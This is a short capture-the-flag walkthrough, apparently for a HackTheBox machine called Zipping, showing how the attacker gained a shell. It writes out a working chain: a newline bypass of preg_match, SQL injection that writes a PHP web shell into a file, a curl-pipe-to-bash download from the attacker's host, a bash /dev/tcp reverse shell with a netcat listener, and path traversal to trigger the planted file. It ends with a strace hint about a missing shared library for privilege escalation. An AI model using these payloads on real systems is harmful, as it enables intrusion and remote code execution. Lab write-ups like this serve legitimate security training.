# Reverse shell
Ok so we can bypass `preg_match` using `%0A` before the value.

We create a reverse shell
```bash title="localhost"
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.221/4444 0>&1'" > rev.sh
```

We host it to a python server
```bash title="localhost"
python3 -m http.server 80
```

We start a nc listening on the port we choose

```bash title="localhost"
nc -lvp 4444
```

We download the shell on the target machine using the `preg_match` bypass
```bash title="localhost"
curl -s $'http://zipping.htb/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.14.221/rev.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/revs.php\'+%231'
```

we start the reverse shell using `preg_match` bypass again.

```bash title="localhost"
curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frevs'
```

on the listening connection we get a reverse shell!

## Debugging
Using `strace /usr/bin/stock` we can debug the program and find out that the program is trying to use a non-existent file, `/home/rektsu/.config/libcounter.so`.

So, we will create the file and then run the `stock` again.

